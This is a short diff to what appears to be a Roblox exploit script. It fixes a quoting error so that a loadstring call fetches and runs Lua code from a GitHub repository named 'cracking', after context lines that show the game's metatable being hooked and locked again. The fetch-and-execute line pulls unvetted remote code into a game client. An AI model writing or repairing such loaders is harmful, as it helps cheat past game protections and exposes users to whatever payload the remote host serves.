@@ -15,4 +15,4 @@ end)
 
 setreadonly(gameMT, true)
 task.wait(0.5)
-loadstring("game:HttpGet("https://raw.githubusercontent.com/imhenne187/cracking/refs/heads/main/iyoulin/Nov23Y.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imhenne187/cracking/refs/heads/main/iyoulin/Nov23Y.lua"))()
